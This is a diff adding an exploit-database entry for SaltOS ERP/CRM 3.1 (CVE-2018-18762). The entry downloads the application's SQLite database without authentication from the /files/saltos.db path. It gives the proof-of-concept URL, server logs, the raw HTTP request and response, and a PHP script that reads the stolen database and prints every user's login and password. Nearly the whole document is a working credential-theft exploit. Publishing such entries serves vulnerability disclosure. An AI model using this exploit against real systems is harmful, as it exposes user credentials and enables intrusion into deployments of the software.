@@ -1,0 +1,47 @@
+# Exploit Title: SaltOS Erp, Crm 3.1 r8126 - Database File Download
+# Dork: N/A
+# Date: 2018-10-29
+# Exploit Author: Ihsan Sencan
+# Vendor Homepage: http://www.saltos.org/
+# Software Link: http://download.saltos.org/?app=saltos&format=xul&arch=win32
+# Version: 3.1 r0 / 3.x
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: CVE-2018-18762
+
+# POC: 
+# 1)
+# http://localhost/[PATH]/files/saltos.db
+# 
+# [Mon Oct 29 00:05:49 2018] 127.0.0.1:2853 [200]: /index.php?action=logout
+# [Mon Oct 29 00:05:49 2018] 127.0.0.1:2856 [200]: /
+# [Mon Oct 29 00:05:51 2018] 127.0.0.1:2857 [200]: /files/saltos.db
+# 
+GET /files/saltos.db HTTP/1.1
+Host: localhost:57187
+User-Agent: Mozilla/5.0 (Windows NT 5.1; rv:50.0) Gecko/20100101 Firefox/50.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Cookie: PHPSESSID=a06furpg1gf54hqf573l886qs3; lang=es_ES; __lang__=1543317075; style=blue; __style__=1543317075; iconset=silk; __iconset__=1543317075
+DNT: 1
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+HTTP/1.1 200 OK
+Host: localhost:57187
+Connection: close
+Content-Type: application/octet-stream
+Content-Length: 8462336
+
+<?php
+
+$baglan = new SQLite3('saltos.db');
+
+$sonuc = $baglan->query('SELECT * FROM tbl_usuarios');
+
+while ($p = $sonuc->fetchArray()) {?>
+
+<h4><?php echo $p['login'];?></h4>
+<h4><?php echo $p['password'];?></h4>
+
+<?php } ?>
